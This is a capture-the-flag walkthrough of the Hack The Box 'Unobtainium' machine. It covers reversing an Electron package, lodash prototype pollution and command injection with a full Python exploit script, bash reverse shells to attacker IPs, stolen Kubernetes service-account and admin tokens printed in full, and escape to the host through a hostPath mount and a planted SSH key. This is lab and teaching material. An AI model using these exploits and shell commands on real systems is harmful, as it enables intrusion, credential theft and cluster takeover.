![](unobtainium_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.10.235 unobtainium.htb

**nmap scan:**
```bash
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
# ...[snip] ...
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-05-30T07:10:33
|_Not valid after:  2022-05-31T07:10:33
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

* In first visit, Don't find anything intresing anywhere. Only Apache httpd on port 80 contains a downloadable archive.

![](screenshots/port-80.png)

# Foothold

## Reversing Electron application deb package

Unzip downloaded archive gets a deb package. we can use dpkg to view control information of the deb package. *get from [here](https://serverfault.com/questions/88510/how-do-i-show-the-actions-that-installing-a-deb-package-will-take)*

![](screenshots/deb-control-info.png)

Found Some information
* Hostname: `unobtainium.htb`
* Username: `felamos@unobtainium.htb`

Extract files from deb file with `ar` utility.
```bash
ar -xv unobtainium_1.0.0_amd64.deb
```

![](screenshots/reverse-deb.png)

`control.tar.gz` archive contains scripts used by package installer to install binaries.
```bash
❯ tar -xvf control.tar.gz
./
./postinst
./postrm
./control
./md5sums
```

From these tar archives get some information about that package.
* This application written in [Electron framework](https://www.electronjs.org/)
* Package created with [FPM](https://github.com/jordansissel/fpm)

`data.tar.xz` contians all execuatable binaries under `./opt/unobtainium` folder.

![](screenshots/exec-app.png)

All Electron framework creates An [asar archive](https://electron.ebookchain.org/en/tutorial/application-packaging.html) is a simple tar-like format that concatenates files into a single file to mitigate issues around long path names, slightly speed up require and conceal your source code from cursory inspection.Electron can read arbitrary files from it without unpacking the whole file.

We can find that file in `./opt/unobtainium/resources` and Extract it with [`asar`](https://github.com/electron/asar). *get from [here](https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file)*

![](screenshots/asar-extract.png)

only interesting file found on application source code is `todo,js`

![](screenshots/todo-js.png)

Found interesting information
* User creds: `felamos:Winter2021`
* this script sending post request to `/todo` and requesting for a txt file.

If we go to "TODO" in the app, we get the todo list.

![](screenshots/app-todo.png)

Intercepting application traffic on burp by setting `http_proxy` environment variable. *get from [here](https://blog.ropnop.com/proxying-cli-tools/)*
```bash
export http_proxy=127.0.0.1:8080
```

Intercepting `/todo` request, and changing `"filename":"todo.txt"` value. gets an error with empty value.

![](screenshots/no-file-error.png)

after some try, get some idea that we are currently `/usr/src/app/` here and we can not go anywhere from here, but we can read any file inside that directory. 

try to Read for `./index.js` file

![](screenshots/get-index-file.png)

Get some interesting information from `index.js` file

* There are 2 user, in this application, admin user password is random, so not possible to get it.

  ![](screenshots/two-users.png)

* There is a another endpoint `/upload`

  ![](screenshots/upload-endpoint.png)
  * But it is checking for `user.canUpload` and only admin can upload. So this never gonna possible.

Don't find anything in `index.js` that can be exploitable.

Next Checking `package.json` for any outdated or vulnerable dependencies used by this application and found 2 dependencies and both are outdated and vulnerable.

![](screenshots/outdated-deps.png)

## Prototype Pollution

1. [`lodash: 4.17.4`](https://www.npmjs.com/package/lodash/v/4.17.4) is vulnerable for [Prototype Pollution](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications) Vulnerability, **[CVE-2018-16487](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16487):** [snyk Vulnerability DB](https://snyk.io/vuln/SNYK-JS-LODASH-73638), in lodash <4.17.11 functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of `Object.prototype`.

  * And we can verify this from `index.js` file that put method when sending message it uses `_.merge`

    ![](screenshots/put-message.png)

  * Exploit PoC from [Kirill89@github.com](https://github.com/Kirill89/prototype-pollution-explained)

**Exploit**

* We can use Prototype Pollution Vulnerability to enable `canUpload` for user `felamos`

      {"auth":{"name":"felamos","password":"Winter2021"},"message":{"text": "test", "__proto__": {"canUpload": true}}}

  ![](screenshots/send-proto.png)

## Command injection

2. [`google-cloudstorage-commands : 0.0.1`](https://www.npmjs.com/package/google-cloudstorage-commands) **CVE-2020-28436:** [snyk Vulnerability DB](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431), Affected versions of this package are vulnerable to Command Injection from `upload` function. If we check [source code](https://github.com/samradical/google-cloudstorage-commands/blob/e69c931c4363be266489b26a1766760c9fce08d2/index.js#L7-L16) of this library, it is using `exec` function to upload file.

  * And we can verify this from `index.js` file that `/upload` is using `upload()` function.

    ![](screenshots/upload-ci.png)

  * PoC Found on [snyk Vulnerability DB](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431)

**Exploit**

* now we can Use `/upload` endpoint with user "`felamos`" credentials to inject system command into `upload()` function from `filename` parameter.

      {"auth":{"name":"felamos","password":"Winter2021"},"filename":"& <command>"}

  ![](screenshots/exec-cmd.png)

### Automate script

```py
import argparse
import json
import requests as r
import sys

parser = argparse.ArgumentParser()
url = 'http://10.10.10.235:31337'


def read_file(file):
    data = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": f"{file}"}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.post(f'{url}/todo', data=jsonify, headers=headers)
    cleaned = rspn.text.replace('\\n', '\n').replace('\\', '')
    return cleaned


def send_proto():
    data = {"auth": {"name": "felamos", "password": "Winter2021"},
            "message": {"text": "Prototype_Pollution", "__proto__": {"canUpload": True}}}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.put(url, data=jsonify, headers=headers)
    return rspn.text


def exec_cmd(cmd):
    data = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": f"& {cmd}"}
    jsonify = json.dumps(data)
    headers = {'Content-type': 'application/json', 'Accept': 'application/json, text/javascript, */*; q=0.01'}
    rspn = r.post(f'{url}/upload', data=jsonify, headers=headers)
    return rspn.text


parser.add_argument('-r', '--read-file', help="<filename> Read file, Only application files")
parser.add_argument('-U', action='store_true', help="Enable file Upload")
parser.add_argument("-c", '--command', help="Send blind System Command")
args = parser.parse_args()

if __name__ == "__main__":
    try:
        if args.read_file:
            print(read_file(args.read_file))
        elif args.U:
            print(send_proto())
        elif args.command:
            print(exec_cmd(args.command))
        else:
            print(f"[-] Try python {sys.argv[0]} -h")
    except KeyboardInterrupt:
        print('User has exited the program')
```

And finally get reverse shell
```bash
❯ python exploit.py -c '/bin/bash -c "bash -i >& /dev/tcp/10.10.15.71/4141 0>&1"'
```

![](screenshots/rev-shell.png)


# Privesc

* We are inside kubentes container
```bash
[+] Container Platform ...... kubentes
```

There is a crontab `/var/spool/cron/crontabs/root` running from root inside container

![](screenshots/cron-in-kube.png)

This crontab is removing any file/binary with name "kubectl". That means this container don't want us to install `kubectl` command in this container. 

## Kubernetes

[Kubernetes](https://kubernetes.io/) is an open-source container orchestration platform that enables the operation of an elastic web server framework for cloud applications. **Source** [vmware.com](https://www.vmware.com/topics/glossary/content/kubernetes)

**[Cluster](https://www.vmware.com/topics/glossary/content/kubernetes-cluster):** A Kubernetes cluster is a set of nodes that run containerized applications. Multiple computer network or a supercomputer with tone of resources divided into small nodes.

**[Node](https://kubernetes.io/docs/concepts/architecture/nodes/):** Kubernetes runs your workload by placing containers into Pods to run on Nodes. A node may be a virtual or physical machine, depending on the cluster.

**[Pods](https://kubernetes.io/docs/concepts/workloads/pods/):** Pod is similar to a group of Docker containers with shared namespaces and shared filesystem volumes.

**[Containers](https://kubernetes.io/docs/concepts/containers/):** A container is a standard unit of software that packages up code and all its dependencies required for a application to run.

![](screenshots/Kubernetes.png)

### Service Account

From [hacktricks notes](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#service-account-tokens)

ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.
Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.

Usually in the directory `/run/secrets/kubernetes.io/serviceaccount` or `/var/run/secrets/kubernetes.io/serviceaccount` you can find the files:

* `ca.crt`: It's the ca certificate to check kubernetes communications
* `namespace`: It indicates the current namespace
* `token`: It contains the service token of the current pod.

![](screenshots/kube-service-ac.png)

## Kubectl

* https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1
* https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/

### Connect to Kubernetes api

Found blog for [create kubeconfig](http://docs.shippable.com/deploy/tutorial/create-kubeconfig-for-self-hosted-kubernetes-cluster/)

* `token` come from `/run/secrets/kubernetes.io/serviceaccount/token`
* `certificate-authority-data` come form `/run/secrets/kubernetes.io/serviceaccount/ca.crt` in base64 encoded format

```yaml
apiVersion: v1
kind: Config
users:
- name: poorduck
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1ERXdOekV6TWpRME9Wb1hEVE14TURFd05qRXpNalEwT1Zvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTVRDCmozSE9PMXRhaE1PUHpkNjhuYUtoQmVpYUFaM2lxdC9TY25lZ1RnbEttdHo1RGFnRUQ1WWFqWk0rVXl2UEVxUSsKdSttYjFaYzFLYnJjMkZnM0M0OEJZN09JUDZHZk9YOTkwUERLSmhxWnRhT0FkY1U1R2ExYXZTK2wzZG82VjJrQwplVnN0d1g2U1ZJYnpHSkVVeE1VUGlac0Z0Nkhzdk43aHRQMVA1Z2V3d3Rnc1ZJWER5TGwvZVJmd0NuMlpXK24zCk5nQzRPSTg0empWSHBYbVhGYUdzZURIYi9FNHdLL04waE1EMERFVlBKc0VPb2dITTlMbmRVZ3lKbWhBdFdiRWoKMjUrSDhBd1FpMy84UFlORXNtdFNBVUV1V3RZMzZweC9zRDVDdGhpTmxOcGtCNXQ1YzFHSzkwRG15b2ZxQmdZdgo5d2tDTkdHWktwM0F4TU1OMm5zQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFBSEpqbzhVYzNTSDFVbnNLU3daSlR1eWozNlcvbXNiTXIwcFNuM2RsRTZCb3V1a2hGMwo5R3htVmEyYW40L1ZGSmtBc1pTcUZVejFlNTJxdkpvRkpjWGVjNE1pTjZHWlRXdVVBOUQvanFpYXBuSFdlTzh4ClJHazRXTjY2WnJhTTBYM1BxYUhvK2NiZmhLT2xMOWprVXh2RSszQld1ajlwbHlEM245dEZlM2xuYXNEZnp5NE0KcTQ2NWl4UFpxRnFWY2h4UUZRK3BaMjRLaXFvUVc0bWFtL3g1RlB5MTMrTXc4SjR6Yjh2TGR1dkxRUjN3cFVHYgp2S1hkbktPTFdzaUV4eXJqcFpqWmJZQkw4YjcwNVhGRkd2bWFicDIxYUc4cHNCMVh2c0xpR0ZRRXF5RGZlRlJXCmhsN0twVUlTbDQrTnA1c0FpWE53dGJTREUrMjJRVnRaYnVEbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t
    server: https://10.10.10.235:8443/
  name: unobtainium-cluster
contexts:
- context:
    cluster: unobtainium-cluster
    user: poorduck
  name: context
current-context: context
preferences:
  colours: true
```

Save this config file in the `~/.kube/config` and then we can access to Kubernetes api from our machine.

### Enumeration

Follow-up with [hacktricks notes](https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#using-kubectl)

Check if we can read secret from current pod, but we don't
```bash
kubectl get secrets -o yaml -n kube-system
```

![](screenshots/secret-webapp-pod.png)

**namespace:** Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called namespaces.
```bash
kubectl get namespaces
```

![](screenshots/kube-namespace.png)

There is a virtual clusters "dev"

Checking permission of Current Privileges in kubeernetes api, we can list  "dev" cluster pods.
```bash
kubectl auth can-i --list -n dev
```

![](screenshots/kube-get-perms.png)

```bash
kubectl get pods -n dev
```

![](screenshots/kube-dev-pods.png)

If we check one of the pod information, we can see that they all pods are running a node application on port 3000. These are the replicas of the application that is running on public port 31337, Where we found the prototype pollution and command injection.
```bash
kubectl describe pod <pod_name> -n dev
```

![](screenshots/pod-service.png)

We can verify that this is the same app by sending same todo request.
```bash
curl -s -X POST 'http://172.17.0.6:3000/todo' --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "todo.txt"}' -H 'Content-type: application/json'
```

![](screenshots/pod-app.png)

## Root shell in Dev

Setup socat listener to redirect local reverse shell to our machine.
```bash
./socat tcp-l:8080 tcp:10.10.14.15:443 &
```

Exploit Prototype Pollution to enable upload funcnality
```bash
curl -s -X PUT 'http://172.17.0.10:3000' --data '{"auth": {"name": "felamos", "password": "Winter2021"},"message": {"text": "Prototype_Pollution", "__proto__": {"canUpload": true}}}' -H 'Content-type: application/json'
```

Exloit Command injection to get reverse shell
```bash
curl -s -X POST 'http://172.17.0.10:3000/upload' --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "& /bin/bash -c \"bash -i >& /dev/tcp/172.17.0.5/8080 0>&1\""}' -H 'Content-type: application/json'
```

![](screenshots/pod-app-rev-shell.png)

**_Replace kubeconfig token with current pod token_**
<!--
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw
-->

Trying to get secret from this pod, This time we get secrets and found admin token
```bash
kubectl get secrets -o yaml -n kube-system
```

![](screenshots/admin-token.png)
<!--
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
-->

## kubernetes with admin token

Now if we check Current Privileges again from admin token, there is a extra rule and with that we can do all commands on all resources

![](screenshots/admin-Privileges.png)

with that we can edit cluster deployment config file and mount host root in the pod.

Edit `webapp-deployment` deployment config file.
```bash
kubectl edit deployment webapp-deployment
```

in `webapp-deployment` there is already a host volume `/opt/user/` is mounted in the deployment `/root`

![](screenshots/edit-deployment.png)

here we can simply edit host path to root `/` and get host root filesystem in the container's `/root`

after edited check if deployment get restarted and new pods generated.
```bash
kubectl get pods --all-namespaces
```

Here one problem i notice that after adding host root filesystem in `webapp-deployment`, this cluster died in every minute and regenerate again

![](screenshots/deployment-in-loop.png)

there seems to be a cron killing containers every minute.

We can put ssh key in the host `/root` after mounted in the pod under one minute and then ssh in.

Check new generated pod name with `kubectl get pods --all-namespaces`

get inside that pod
```bash
kubectl exec -it webapp-deployment-7bd959c968-flvg2 -- bash
```

And put ssh key
```bash
mkdir /root/root/.ssh
chmod 700 /root/root/.ssh
echo "<id_rsa.pub>" > /root/root/.ssh/authorized_keys
chmod 600 /root/root/.ssh/authorized_keys
```

![](screenshots/rooted.png)



